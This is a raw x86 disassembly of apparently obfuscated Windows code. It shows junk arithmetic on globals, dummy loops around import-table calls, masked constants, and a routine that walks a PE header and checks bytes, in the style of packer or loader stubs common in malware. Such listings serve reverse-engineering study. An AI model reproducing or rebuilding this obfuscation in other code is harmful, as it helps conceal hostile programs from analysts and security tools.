  4231ec:	xor    ecx,ecx
  4231ee:	or     ecx,DWORD PTR ds:0x42a409
  4231f4:	dec    ecx
  4231f5:	mov    DWORD PTR ds:0x42a409,ecx
  4231fb:	mov    ecx,DWORD PTR ds:0x42a409
  423201:	dec    ecx
  423202:	mov    DWORD PTR ds:0x42a409,ecx
  423208:	jmp    0x4231bf
  42320d:	mov    ecx,0x8a36
  423212:	xor    ax,cx
  423215:	mov    ecx,0x3afc
  42321a:	add    ax,cx
  42321d:	mov    ecx,DWORD PTR [ebp+0x8]
  423220:	movzx  eax,ax
  423223:	not    eax
  423225:	and    eax,DWORD PTR [ecx]
  423227:	mov    ecx,DWORD PTR [ebp+0x8]
  42322a:	mov    DWORD PTR [ecx],eax
  42322c:	jmp    0x423238
  423231:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  423238:	mov    ax,WORD PTR [ebp-0x8]
  42323c:	push   DWORD PTR [ebp+0x8]
  42323f:	call   0x423250
  423244:	test   eax,eax
  423246:	je     0x423231
  42324c:	leave  
  42324d:	ret    0x4
  423250:	push   ebp
  423251:	mov    ebp,esp
  423253:	sub    esp,0x2c
  423256:	adc    DWORD PTR ds:0x42a405,0x7c56
  423260:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  423267:	mov    eax,ds:0x42a331
  42326c:	and    DWORD PTR ds:0x42a2d9,eax
  423272:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  423279:	mov    ecx,DWORD PTR ds:0x42a35d
  42327f:	mov    ecx,DWORD PTR [ecx]
  423281:	sub    DWORD PTR ds:0x42a339,ecx
  423287:	mov    eax,0x9567
  42328c:	movzx  ecx,BYTE PTR ds:0x42a2ed
  423293:	add    DWORD PTR ds:0x42a2fd,ecx
  423299:	mov    WORD PTR [ebp-0x4],ax
  42329d:	sub    DWORD PTR ds:0x42a3f5,edi
  4232a3:	lea    eax,[ebp-0x24]
  4232a6:	and    ecx,DWORD PTR ds:0x42a381
  4232ac:	mov    DWORD PTR [ebp-0x28],eax
  4232af:	xor    DWORD PTR ds:0x42a345,0xe76
  4232b9:	mov    eax,DWORD PTR [ebp+0x8]
  4232bc:	adc    DWORD PTR ds:0x42a3cd,ecx
  4232c2:	mov    DWORD PTR [ebp-0x20],eax
  4232c5:	push   ebx
  4232c6:	and    DWORD PTR ds:0x42a349,0x0
  4232d0:	jmp    0x4232e2
  4232d5:	mov    ecx,DWORD PTR ds:0x42a349
  4232db:	inc    ecx
  4232dc:	mov    DWORD PTR ds:0x42a349,ecx
  4232e2:	cmp    DWORD PTR ds:0x42a349,0x1c
  4232e9:	jae    0x42338c
  4232ef:	cmp    DWORD PTR ds:0x42a349,0x5
  4232f6:	jne    0x423318
  4232fc:	push   DWORD PTR [ebp-0x10]
  4232ff:	push   0x7dd5
  423304:	push   DWORD PTR [ebp-0x14]
  423307:	push   DWORD PTR [ebp-0x14]
  42330a:	push   DWORD PTR [ebp-0x28]
  42330d:	push   0x2385
  423312:	call   DWORD PTR ds:0x4251f4
  423318:	cmp    DWORD PTR ds:0x42a349,0x4
  42331f:	jne    0x423334
  423325:	xor    ecx,ecx
  423327:	add    ecx,DWORD PTR ds:0x42a349
  42332d:	inc    ecx
  42332e:	mov    DWORD PTR ds:0x42a349,ecx
  423334:	jmp    0x4232d5
  423339:	and    DWORD PTR ds:0x42a3f9,0x0
  423343:	mov    ebx,DWORD PTR ds:0x42a3f9
  423349:	inc    ebx
  42334a:	mov    DWORD PTR ds:0x42a3f9,ebx
  423350:	cmp    DWORD PTR ds:0x42a3f9,0x2a
  423357:	jne    0x423379
  42335d:	push   DWORD PTR [ebp-0xc]
  423360:	push   DWORD PTR [ebp-0x24]
  423363:	push   DWORD PTR [ebp-0x10]
  423366:	push   DWORD PTR [ebp-0x28]
  423369:	push   0x4619
  42336e:	push   0x8205
  423373:	call   DWORD PTR ds:0x42536c
  423379:	cmp    DWORD PTR ds:0x42a3f9,0x1c
  423380:	jb     0x423343
  423386:	adc    DWORD PTR ds:0x42a2f9,ebx
  42338c:	lea    eax,[ebp-0x18]
  42338f:	xor    ebx,ebx
  423391:	xor    ebx,DWORD PTR ds:0x42a325
  423397:	mov    ecx,DWORD PTR ds:0x42a3a9
  42339d:	sub    ebx,ecx
  42339f:	and    ebx,DWORD PTR [ebx+ecx*1]
  4233a2:	mov    DWORD PTR [ebp-0x1c],eax
  4233a5:	dec    ecx
  4233a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4233a9:	xor    DWORD PTR ds:0x42a3bd,ebx
  4233af:	push   esi
  4233b0:	adc    ebx,0x6bc2
  4233b6:	push   edi
  4233b7:	sbb    DWORD PTR ds:0x42a3fd,edx
  4233bd:	mov    edi,0xf89f2e50
  4233c2:	and    ecx,esi
  4233c4:	mov    DWORD PTR [eax],edi
  4233c6:	and    DWORD PTR ds:0x42a34d,0x0
  4233d0:	mov    ebx,DWORD PTR ds:0x42a34d
  4233d6:	inc    ebx
  4233d7:	mov    DWORD PTR ds:0x42a34d,ebx
  4233dd:	cmp    DWORD PTR ds:0x42a34d,0xa
  4233e4:	jne    0x4233f0
  4233ea:	call   DWORD PTR ds:0x425034
  4233f0:	cmp    DWORD PTR ds:0x42a34d,0x9
  4233f7:	jne    0x42340a
  4233fd:	mov    ebx,DWORD PTR ds:0x42a34d
  423403:	inc    ebx
  423404:	mov    DWORD PTR ds:0x42a34d,ebx
  42340a:	cmp    DWORD PTR ds:0x42a34d,0x11
  423411:	jb     0x4233d0
  423417:	mov    eax,DWORD PTR [ebp-0x14]
  42341a:	mov    ecx,DWORD PTR ds:0x42a3d9
  423420:	xor    esi,esi
  423422:	or     esi,DWORD PTR ds:0x42a3e9
  423428:	sub    ecx,esi
  42342a:	or     ecx,DWORD PTR [ecx+esi*1]
  42342d:	mov    ebx,DWORD PTR [ebp-0x8]
  423430:	mov    ecx,0x7510850
  423435:	sbb    DWORD PTR ds:0x42a2f5,0x30f6
  42343f:	xor    eax,ecx
  423441:	sub    esi,DWORD PTR ds:0x42a2e1
  423447:	mov    esi,0x327298
  42344c:	xor    ebx,ecx
  42344e:	and    DWORD PTR ds:0x42a371,0x225a
  423458:	xor    edx,edx
  42345a:	add    eax,esi
  42345c:	adc    DWORD PTR ds:0x42a3fd,0x42a3b1
  423466:	add    ebx,esi
  423468:	or     DWORD PTR ds:0x42a389,0x31e2
  423472:	div    ebx
  423474:	mov    edx,DWORD PTR [ebp-0x20]
  423477:	mov    DWORD PTR [ebp-0x2c],0x4f35
  42347e:	cmp    eax,DWORD PTR [edx]
  423480:	je     0x42358f
  423486:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  42348d:	lea    eax,[ebp-0xc]
  423490:	mov    DWORD PTR [ebp-0x10],eax
  423493:	mov    eax,DWORD PTR [ebp-0x10]
  423496:	mov    edx,DWORD PTR [eax]
  423498:	imul   edx,edx,0xf89ea9ed
  42349e:	mov    DWORD PTR [eax],edx
  4234a0:	mov    eax,DWORD PTR [ebp-0xc]
  4234a3:	cmp    eax,0x82927a76
  4234a8:	je     0x4234c5
  4234ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4234b1:	or     DWORD PTR [eax],0x60751c9d
  4234b7:	mov    eax,DWORD PTR [ebp-0x8]
  4234ba:	xor    eax,ecx
  4234bc:	add    eax,esi
  4234be:	pop    edi
  4234bf:	pop    esi
  4234c0:	pop    ebx
  4234c1:	leave  
  4234c2:	ret    0x4
  4234c5:	mov    eax,DWORD PTR [ebp-0xc]
  4234c8:	add    eax,DWORD PTR [ebp-0x18]
  4234cb:	cmp    eax,0x7b31a8c6
  4234d0:	je     0x4234e4
  4234d6:	mov    eax,DWORD PTR [ebp-0x10]
  4234d9:	and    DWORD PTR [eax],0x751c80
  4234df:	jmp    0x4234b7
  4234e4:	mov    eax,DWORD PTR [ebp-0xc]
  4234e7:	mov    edx,DWORD PTR [ebp-0x18]
  4234ea:	or     eax,edx
  4234ec:	cmp    eax,0xfa9f7e76
  4234f1:	je     0x423505
  4234f7:	mov    eax,DWORD PTR [ebp-0x10]
  4234fa:	xor    DWORD PTR [eax],0x2650fa8e
  423500:	jmp    0x4234b7
  423505:	mov    ax,WORD PTR [ebp-0x4]
  423509:	mov    edi,DWORD PTR [ebp+0x8]
  42350c:	mov    edi,DWORD PTR [edi]
  42350e:	mov    edx,0x8a36
  423513:	xor    ax,dx
  423516:	mov    edx,0x3afc
  42351b:	add    ax,dx
  42351e:	cmp    ax,WORD PTR [edi]
  423521:	je     0x42356e
  423527:	mov    eax,DWORD PTR [ebp-0x14]
  42352a:	xor    eax,ecx
  42352c:	add    eax,esi
  42352e:	mov    DWORD PTR [ebp-0x24],eax
  423531:	mov    eax,DWORD PTR [ebp-0x28]
  423534:	mov    di,WORD PTR [ebp-0x2c]
  423538:	mov    ebx,0x8a36
  42353d:	xor    di,bx
  423540:	add    di,dx
  423543:	movzx  edx,di
  423546:	mov    edi,DWORD PTR [ebp-0x8]
  423549:	xor    edi,ecx
  42354b:	lea    edx,[edx+edi*1+0x327298]
  423552:	add    DWORD PTR [eax],edx
  423554:	mov    eax,DWORD PTR [ebp-0x20]
  423557:	mov    edx,DWORD PTR [ebp-0x8]
  42355a:	mov    edi,DWORD PTR [ebp-0x24]
  42355d:	xor    edx,ecx
  42355f:	add    edx,esi
  423561:	imul   edx,edi
  423564:	sub    DWORD PTR [eax],edx
  423566:	mov    eax,DWORD PTR [ebp-0x14]
  423569:	jmp    0x4234ba
  42356e:	mov    eax,DWORD PTR [ebp-0xc]
  423571:	mov    edx,DWORD PTR [ebp-0x18]
  423574:	xor    eax,edx
  423576:	cmp    eax,0x7a0d5426
  42357b:	je     0x4234b7
  423581:	mov    eax,DWORD PTR [ebp-0x10]
  423584:	add    DWORD PTR [eax],0x7403502
  42358a:	jmp    0x4234b7
  42358f:	mov    eax,DWORD PTR [ebp-0x1c]
  423592:	cmp    DWORD PTR [eax],edi
  423594:	je     0x4234b7
  42359a:	mov    eax,0x800f1c81
  42359f:	jmp    0x4234be
  4235a4:	push   ebp
  4235a5:	mov    ebp,esp
  4235a7:	sub    esp,0x20
  4235aa:	movzx  eax,WORD PTR ds:0x42a385
  4235b1:	add    DWORD PTR ds:0x42a389,eax
  4235b7:	mov    eax,ds:0x426ae2
  4235bc:	inc    ecx
  4235bd:	mov    eax,DWORD PTR [eax+0x198]
  4235c3:	mov    ecx,DWORD PTR ds:0x42a2f9
  4235c9:	sbb    ecx,DWORD PTR ds:0x42a401
  4235cf:	mov    DWORD PTR ds:0x42a2f9,ecx
  4235d5:	mov    DWORD PTR [ebp-0x8],eax
  4235d8:	mov    eax,DWORD PTR [ebp+0x8]
  4235db:	mov    ecx,DWORD PTR [ebp-0x8]
  4235de:	push   ebx
  4235df:	push   esi
  4235e0:	and    DWORD PTR ds:0x42a33d,ebx
  4235e6:	mov    esi,0x7510850
  4235eb:	mov    ebx,DWORD PTR ds:0x42a3d9
  4235f1:	mov    ebx,DWORD PTR [ebx]
  4235f3:	adc    DWORD PTR ds:0x42a2fd,ebx
  4235f9:	xor    eax,esi
  4235fb:	adc    DWORD PTR ds:0x42a3fd,edi
  423601:	push   edi
  423602:	mov    edi,0x327298
  423607:	add    ebx,0x6f46
  42360d:	add    eax,edi
  42360f:	dec    DWORD PTR ds:0x42a34d
  423615:	mov    DWORD PTR [ecx],eax
  423617:	sub    ebx,DWORD PTR ds:0x42a381
  42361d:	lea    eax,[ebp-0x4]
  423620:	adc    DWORD PTR ds:0x42a34d,edx
  423626:	mov    DWORD PTR [ebp-0x10],eax
  423629:	mov    eax,DWORD PTR [ebp+0x8]
  42362c:	mov    ecx,DWORD PTR [ebp-0x10]
  42362f:	xor    eax,esi
  423631:	xor    ebx,0x10f8
  423637:	add    eax,edi
  423639:	mov    DWORD PTR [ecx],eax
  42363b:	adc    DWORD PTR ds:0x42a339,ebx
  423641:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  423648:	xor    ecx,ecx
  42364a:	xor    ecx,DWORD PTR ds:0x42a3d5
  423650:	mov    ebx,DWORD PTR ds:0x42a429
  423656:	sub    ebx,ecx
  423658:	or     ecx,DWORD PTR [ecx+ebx*1]
  42365b:	lea    eax,[ebp-0x14]
  42365e:	mov    DWORD PTR [ebp-0x20],eax
  423661:	sbb    eax,0x5cc1
  423666:	mov    eax,DWORD PTR [ebp-0x14]
  423669:	mov    ecx,DWORD PTR [ebp-0x20]
  42366c:	movzx  ebx,BYTE PTR ds:0x42a3f9
  423673:	xor    ebx,DWORD PTR ds:0x42a2ed
  423679:	mov    DWORD PTR ds:0x42a3f9,ebx
  42367f:	xor    eax,esi
  423681:	and    DWORD PTR ds:0x42a3b9,0x0
  42368b:	xor    ebx,ebx
  42368d:	or     ebx,DWORD PTR ds:0x42a3b9
  423693:	inc    ebx
  423694:	mov    DWORD PTR ds:0x42a3b9,ebx
  42369a:	cmp    DWORD PTR ds:0x42a3b9,0x29
  4236a1:	jne    0x4236b7
  4236a7:	push   0x42a2fd
  4236ac:	push   0x6420
  4236b1:	call   DWORD PTR ds:0x4251f8
  4236b7:	cmp    DWORD PTR ds:0x42a3b9,0x19
  4236be:	jb     0x42368b
  4236c4:	movzx  ebx,BYTE PTR ds:0x42a3c5
  4236cb:	or     DWORD PTR ds:0x42a40d,ebx
  4236d1:	add    eax,edi
  4236d3:	and    DWORD PTR ds:0x42a38d,0x0
  4236dd:	jmp    0x4236ef
  4236e2:	mov    ebx,DWORD PTR ds:0x42a38d
  4236e8:	inc    ebx
  4236e9:	mov    DWORD PTR ds:0x42a38d,ebx
  4236ef:	cmp    DWORD PTR ds:0x42a38d,0x1a
  4236f6:	jae    0x423732
  4236fc:	cmp    DWORD PTR ds:0x42a38d,0x1e
  423703:	jne    0x423723
  423709:	push   0x7bb6
  42370e:	push   0x76ae
  423713:	push   0x616c
  423718:	push   0x1d5f
  42371d:	call   DWORD PTR ds:0x4251fc
  423723:	jmp    0x4236e2
  423728:	sbb    DWORD PTR ds:0x42a3c1,0x6dc2
  423732:	mov    DWORD PTR [ecx],eax
  423734:	not    ebx
  423736:	mov    eax,ds:0x426bb6
  42373b:	sbb    DWORD PTR ds:0x42a40d,0x4cd8
  423745:	mov    ebx,0x8e12febf
  42374a:	and    DWORD PTR ds:0x42a3b5,0x42a2e1
  423754:	mov    DWORD PTR [ebp-0xc],ebx
  423757:	mov    eax,DWORD PTR [eax]
  423759:	sub    DWORD PTR ds:0x42a3b1,0x42a2ed
  423763:	mov    cx,WORD PTR [ebp-0x4]
  423767:	movzx  ecx,cx
  42376a:	xor    DWORD PTR ds:0x42a2e5,0x42a301
  423774:	add    ecx,DWORD PTR [eax]
  423776:	mov    DWORD PTR [ebp-0x18],ecx
  423779:	mov    eax,DWORD PTR [ebp+0x8]
  42377c:	mov    ecx,DWORD PTR [ebp-0x8]
  42377f:	and    DWORD PTR ds:0x42a301,0x42a349
  423789:	xor    eax,esi
  42378b:	add    DWORD PTR ds:0x42a3bd,0x42a3fd
  423795:	add    eax,edi
  423797:	cmp    DWORD PTR [ecx],eax
  423799:	mov    DWORD PTR ds:0x42a33d,0x719a
  4237a3:	jne    0x42395e
  4237a9:	mov    eax,DWORD PTR [ebp+0x8]
  4237ac:	adc    DWORD PTR ds:0x42a389,edx
  4237b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4237b5:	xor    eax,esi
  4237b7:	sbb    DWORD PTR ds:0x42a3f1,0x5040
  4237c1:	add    eax,edi
  4237c3:	cmp    DWORD PTR [ecx],eax
  4237c5:	mov    DWORD PTR ds:0x42a2e5,0x7a60
  4237cf:	jne    0x423906
  4237d5:	and    DWORD PTR ds:0x42a2f1,0x0
  4237df:	jmp    0x4237f2
  4237e4:	xor    eax,eax
  4237e6:	add    eax,DWORD PTR ds:0x42a2f1
  4237ec:	inc    eax
  4237ed:	mov    ds:0x42a2f1,eax
  4237f2:	cmp    DWORD PTR ds:0x42a2f1,0x17
  4237f9:	jae    0x423876
  4237ff:	cmp    DWORD PTR ds:0x42a2f1,0xb
  423806:	jne    0x42381a
  42380c:	push   0x42a331
  423811:	push   DWORD PTR [ebp-0x10]
  423814:	call   DWORD PTR ds:0x425370
  42381a:	cmp    DWORD PTR ds:0x42a2f1,0xa
  423821:	jne    0x423832
  423827:	mov    eax,ds:0x42a2f1
  42382c:	inc    eax
  42382d:	mov    ds:0x42a2f1,eax
  423832:	jmp    0x4237e4
  423837:	and    DWORD PTR ds:0x42a3c5,0x0
  423841:	mov    ecx,DWORD PTR ds:0x42a3c5
  423847:	inc    ecx
  423848:	mov    DWORD PTR ds:0x42a3c5,ecx
  42384e:	cmp    DWORD PTR ds:0x42a3c5,0x27
  423855:	jne    0x423869
  42385b:	push   DWORD PTR [ebp-0x18]
  42385e:	push   0x6019
  423863:	call   DWORD PTR ds:0x425038
  423869:	cmp    DWORD PTR ds:0x42a3c5,0x18
  423870:	jb     0x423841
  423876:	mov    eax,DWORD PTR [ebp+0x8]
  423879:	mov    ecx,DWORD PTR [ebp-0x10]
  42387c:	or     edx,DWORD PTR ds:0x42a389
  423882:	xor    eax,esi
  423884:	xor    edx,DWORD PTR ds:0x42a381
  42388a:	add    eax,edi
  42388c:	sbb    DWORD PTR ds:0x42a385,0x509f
  423896:	mov    DWORD PTR [ecx],eax
  423898:	and    DWORD PTR ds:0x42a3fd,0x0
  4238a2:	jmp    0x4238b2
  4238a7:	mov    eax,ds:0x42a3fd
  4238ac:	inc    eax
  4238ad:	mov    ds:0x42a3fd,eax
  4238b2:	cmp    DWORD PTR ds:0x42a3fd,0x10
  4238b9:	jae    0x4238f5
  4238bf:	cmp    DWORD PTR ds:0x42a3fd,0x8
  4238c6:	jne    0x4238d5
  4238cc:	push   DWORD PTR [ebp-0x28]
  4238cf:	call   DWORD PTR ds:0x42503c
  4238d5:	cmp    DWORD PTR ds:0x42a3fd,0x7
  4238dc:	jne    0x4238f0
  4238e2:	xor    eax,eax
  4238e4:	or     eax,DWORD PTR ds:0x42a3fd
  4238ea:	inc    eax
  4238eb:	mov    ds:0x42a3fd,eax
  4238f0:	jmp    0x4238a7
  4238f5:	mov    eax,DWORD PTR [ebp-0x10]
  4238f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4238fb:	xor    ecx,esi
  4238fd:	mov    edx,0xffcd8d68
  423902:	sub    edx,ecx
  423904:	add    DWORD PTR [eax],edx
  423906:	mov    eax,ds:0x426bb6
  42390b:	mov    eax,DWORD PTR [eax]
  42390d:	mov    cx,WORD PTR [ebp-0x4]
  423911:	movzx  ecx,cx
  423914:	add    ecx,DWORD PTR [eax]
  423916:	mov    DWORD PTR [ebp-0x18],ecx
  423919:	mov    eax,DWORD PTR [ebp+0xc]
  42391c:	mov    ecx,DWORD PTR [ebp+0xc]
  42391f:	xor    eax,esi
  423921:	lea    eax,[eax+eax*1+0x327298]
  423928:	xor    ecx,esi
  42392a:	sub    ecx,eax
  42392c:	mov    ax,WORD PTR [ebp-0x4]
  423930:	movzx  eax,ax
  423933:	cmp    eax,ecx
  423935:	mov    eax,DWORD PTR [ebp+0x10]
  423938:	movzx  ecx,WORD PTR [ebp-0x4]
  42393c:	jg     0x423951
  423942:	xor    eax,esi
  423944:	sub    ecx,eax
  423946:	sub    ecx,edi
  423948:	mov    WORD PTR [ebp-0x4],cx
  42394c:	jmp    0x42395e
  423951:	xor    eax,esi
  423953:	lea    eax,[eax+ecx*1+0x327298]
  42395a:	mov    WORD PTR [ebp-0x4],ax
  42395e:	mov    eax,DWORD PTR [ebp-0xc]
  423961:	cmp    eax,ebx
  423963:	je     0x423977
  423969:	mov    eax,DWORD PTR [ebp-0x8]
  42396c:	mov    DWORD PTR [eax],0x60341eb0
  423972:	jmp    0x423a1e
  423977:	mov    eax,DWORD PTR [ebp+0x8]
  42397a:	mov    ecx,DWORD PTR [ebp-0x8]
  42397d:	xor    eax,esi
  42397f:	add    eax,edi
  423981:	cmp    DWORD PTR [ecx],eax
  423983:	je     0x423a06
  423989:	mov    ecx,DWORD PTR [ebp-0x14]
  42398c:	mov    eax,DWORD PTR [ebp-0x8]
  42398f:	mov    eax,DWORD PTR [eax]
  423991:	mov    eax,DWORD PTR [eax+0x3c]
  423994:	lea    ecx,[ecx*8+0x78]
  42399b:	add    eax,ecx
  42399d:	mov    ecx,DWORD PTR [ebp-0x8]
  4239a0:	mov    ecx,DWORD PTR [ecx]
  4239a2:	mov    eax,DWORD PTR [eax+ecx*1]
  4239a5:	mov    DWORD PTR [ebp-0x1c],eax
  4239a8:	mov    eax,DWORD PTR [ebp+0x8]
  4239ab:	xor    eax,esi
  4239ad:	add    eax,edi
  4239af:	mov    DWORD PTR [ebp-0x20],eax
  4239b2:	mov    eax,DWORD PTR [ebp+0x8]
  4239b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4239b8:	xor    eax,esi
  4239ba:	add    eax,edi
  4239bc:	cmp    ecx,eax
  4239be:	je     0x423a1e
  4239c4:	mov    eax,DWORD PTR [ebp-0x8]
  4239c7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4239ca:	add    ecx,DWORD PTR [eax]
  4239cc:	mov    DWORD PTR [ebp-0x20],ecx
  4239cf:	mov    eax,DWORD PTR [ebp-0x20]
  4239d2:	mov    ecx,DWORD PTR [ebp-0x8]
  4239d5:	mov    eax,DWORD PTR [eax+0xc]
  4239d8:	mov    ecx,DWORD PTR [ecx]
  4239da:	mov    al,BYTE PTR [eax+ecx*1]
  4239dd:	add    al,0x3b
  4239df:	xor    al,0x43
  4239e1:	cmp    al,0xc5
  4239e3:	je     0x4239fa
  4239e9:	mov    eax,DWORD PTR [ebp+0x8]
  4239ec:	mov    ecx,DWORD PTR [ebp-0x8]
  4239ef:	xor    eax,esi
  4239f1:	add    eax,edi
  4239f3:	mov    DWORD PTR [ecx],eax
  4239f5:	jmp    0x423a1e
  4239fa:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  423a01:	jmp    0x423a1e
  423a06:	mov    eax,DWORD PTR [ebp-0x8]
  423a09:	mov    ecx,DWORD PTR [ebp-0x18]
  423a0c:	mov    ecx,DWORD PTR [ecx]
  423a0e:	mov    DWORD PTR [eax],ecx
  423a10:	mov    eax,DWORD PTR [ebp+0xc]
  423a13:	mov    eax,DWORD PTR [ebp+0x8]
  423a16:	push   DWORD PTR [ebp-0x8]
  423a19:	call   0x423171
  423a1e:	mov    eax,DWORD PTR [ebp-0xc]
  423a21:	cmp    eax,ebx
  423a23:	je     0x423779
  423a29:	mov    eax,DWORD PTR [ebp-0x8]
  423a2c:	mov    eax,DWORD PTR [eax]
  423a2e:	pop    edi
  423a2f:	pop    esi
  423a30:	pop    ebx
  423a31:	leave  
  423a32:	ret    0xc
  423a35:	push   ebp
  423a36:	mov    ebp,esp
  423a38:	sub    esp,0x30
  423a3b:	and    eax,DWORD PTR ds:0x42a335
  423a41:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  423a48:	and    DWORD PTR ds:0x42a389,0x0
  423a52:	jmp    0x423a62
  423a57:	mov    eax,ds:0x42a389
  423a5c:	inc    eax
  423a5d:	mov    ds:0x42a389,eax
  423a62:	cmp    DWORD PTR ds:0x42a389,0x13
  423a69:	jae    0x423b0c
  423a6f:	cmp    DWORD PTR ds:0x42a389,0x8
  423a76:	jne    0x423a92
  423a7c:	push   0x0
  423a7e:	push   0x14f3
  423a83:	push   DWORD PTR [ebp-0x1c]
  423a86:	push   DWORD PTR [ebp-0x10]
  423a89:	push   DWORD PTR [ebp-0x1c]
  423a8c:	call   DWORD PTR ds:0x425200
  423a92:	cmp    DWORD PTR ds:0x42a389,0x7
  423a99:	jne    0x423aaa
  423a9f:	mov    eax,ds:0x42a389
  423aa4:	inc    eax
  423aa5:	mov    ds:0x42a389,eax
  423aaa:	jmp    0x423a57
  423aaf:	mov    DWORD PTR ds:0x42a381,0x1e
  423ab9:	cmp    DWORD PTR ds:0x42a381,0x0
  423ac0:	je     0x423b0c
  423ac6:	cmp    DWORD PTR ds:0x42a381,0x8
  423acd:	jne    0x423ae1
  423ad3:	push   DWORD PTR [ebp-0x18]
  423ad6:	push   0x0
  423ad8:	push   DWORD PTR [ebp-0x10]
  423adb:	call   DWORD PTR ds:0x425374
  423ae1:	cmp    DWORD PTR ds:0x42a381,0x9
  423ae8:	jne    0x423af9
  423aee:	mov    eax,ds:0x42a381
  423af3:	dec    eax
  423af4:	mov    ds:0x42a381,eax
  423af9:	xor    eax,eax
  423afb:	xor    eax,DWORD PTR ds:0x42a381
  423b01:	dec    eax
  423b02:	mov    ds:0x42a381,eax
  423b07:	jmp    0x423ab9
  423b0c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  423b13:	mov    ecx,DWORD PTR [ebp-0x4]
  423b16:	sub    eax,0x7c5
  423b1b:	push   ebx
  423b1c:	xor    eax,eax
  423b1e:	or     eax,DWORD PTR ds:0x42a2e5
  423b24:	adc    DWORD PTR ds:0x42a335,eax
  423b2a:	mov    eax,0x7510850
  423b2f:	and    DWORD PTR ds:0x42a389,0x0
  423b39:	jmp    0x423b4b
  423b3e:	mov    ebx,DWORD PTR ds:0x42a389
  423b44:	inc    ebx
  423b45:	mov    DWORD PTR ds:0x42a389,ebx
  423b4b:	cmp    DWORD PTR ds:0x42a389,0x16
  423b52:	jae    0x423bd3
  423b58:	cmp    DWORD PTR ds:0x42a389,0xe
  423b5f:	jne    0x423b6e
  423b65:	push   DWORD PTR [ebp-0x18]
  423b68:	call   DWORD PTR ds:0x425040
  423b6e:	cmp    DWORD PTR ds:0x42a389,0xd
  423b75:	jne    0x423b88
  423b7b:	mov    ebx,DWORD PTR ds:0x42a389
  423b81:	inc    ebx
  423b82:	mov    DWORD PTR ds:0x42a389,ebx
  423b88:	jmp    0x423b3e
  423b8d:	mov    DWORD PTR ds:0x42a401,0x1d
  423b97:	cmp    DWORD PTR ds:0x42a401,0x0
  423b9e:	je     0x423bd3
  423ba4:	cmp    DWORD PTR ds:0x42a401,0x2c
  423bab:	jne    0x423bc1
  423bb1:	push   0x1552
  423bb6:	push   0x42a4e6
  423bbb:	call   DWORD PTR ds:0x425044
  423bc1:	mov    ebx,DWORD PTR ds:0x42a401
  423bc7:	dec    ebx
  423bc8:	mov    DWORD PTR ds:0x42a401,ebx
  423bce:	jmp    0x423b97
  423bd3:	xor    ecx,eax
  423bd5:	and    DWORD PTR ds:0x42a3f1,0x0
  423bdf:	jmp    0x423bf1
  423be4:	mov    ebx,DWORD PTR ds:0x42a3f1
  423bea:	inc    ebx
  423beb:	mov    DWORD PTR ds:0x42a3f1,ebx
  423bf1:	cmp    DWORD PTR ds:0x42a3f1,0x17
  423bf8:	jae    0x423c1f
  423bfe:	cmp    DWORD PTR ds:0x42a3f1,0x27
  423c05:	jne    0x423c14
  423c0b:	push   DWORD PTR [ebp-0xc]
  423c0e:	call   DWORD PTR ds:0x425378
  423c14:	jmp    0x423be4
  423c19:	or     ebx,DWORD PTR ds:0x42a3c1
  423c1f:	mov    ebx,0x327298
  423c24:	adc    DWORD PTR ds:0x42a3cd,0x42a371
  423c2e:	add    ecx,ebx
  423c30:	mov    DWORD PTR ds:0x42a409,0x58ad
  423c3a:	mov    DWORD PTR [ebp-0x1c],ecx
  423c3d:	and    DWORD PTR ds:0x42a2dd,ebx
  423c43:	mov    ecx,DWORD PTR [ebp+0x14]
  423c46:	push   esi
  423c47:	push   edi
  423c48:	sbb    DWORD PTR ds:0x42a339,0x49a0
  423c52:	test   ecx,ecx
  423c54:	je     0x423c6e
  423c5a:	adc    DWORD PTR ds:0x42a2dd,0x603
  423c64:	mov    ecx,DWORD PTR [ebp+0x14]
  423c67:	mov    ecx,DWORD PTR [ecx]
  423c69:	sub    edi,esi
  423c6b:	mov    DWORD PTR [ebp-0x1c],ecx
  423c6e:	and    DWORD PTR ds:0x42a3b5,0x0
  423c78:	mov    ecx,DWORD PTR ds:0x42a3b5
  423c7e:	inc    ecx
  423c7f:	mov    DWORD PTR ds:0x42a3b5,ecx
  423c85:	cmp    DWORD PTR ds:0x42a3b5,0x24
  423c8c:	jne    0x423ca2
  423c92:	push   0x575c
  423c97:	push   0x61f5
  423c9c:	call   DWORD PTR ds:0x42537c
  423ca2:	cmp    DWORD PTR ds:0x42a3b5,0x18
  423ca9:	jb     0x423c78
  423caf:	imul   edx,eax
  423cb2:	mov    ecx,0x4573
  423cb7:	sub    DWORD PTR ds:0x42a341,0x7410
  423cc1:	add    edx,ecx
  423cc3:	sub    esi,esi
  423cc5:	mov    esi,0x7879
  423cca:	xor    DWORD PTR ds:0x42a2f5,0x42a2f1
  423cd4:	mov    edi,0x1556
  423cd9:	xchg   esi,ecx
  423cdb:	sub    ecx,DWORD PTR ds:0x42a38d
  423ce1:	sub    edx,edi
  423ce3:	xor    esi,esi
  423ce5:	add    ecx,0x38ee
  423ceb:	mov    DWORD PTR [ebp-0x28],esi
  423cee:	mov    DWORD PTR [ebp-0x2c],esi
  423cf1:	mov    DWORD PTR [ebp-0x14],esi
  423cf4:	xor    DWORD PTR ds:0x42a371,0x1187
  423cfe:	mov    DWORD PTR [ebp-0x8],esi
  423d01:	mov    ecx,DWORD PTR [ebp-0x18]
  423d04:	sub    DWORD PTR ds:0x42a2f9,0x42a3c1
  423d0e:	xor    ecx,eax
  423d10:	xor    edi,edi
  423d12:	add    DWORD PTR ds:0x42a2f5,0x42a341
  423d1c:	add    ecx,ebx
  423d1e:	mov    eax,ds:0x42a405
  423d23:	mov    DWORD PTR [ebp-0x20],ecx
  423d26:	mov    eax,DWORD PTR [ebp-0x20]
  423d29:	je     0x423f78
  423d2f:	mov    eax,DWORD PTR [ebp-0x4]
  423d32:	xor    eax,0x7510850
  423d37:	add    eax,ebx
  423d39:	cmp    edi,eax
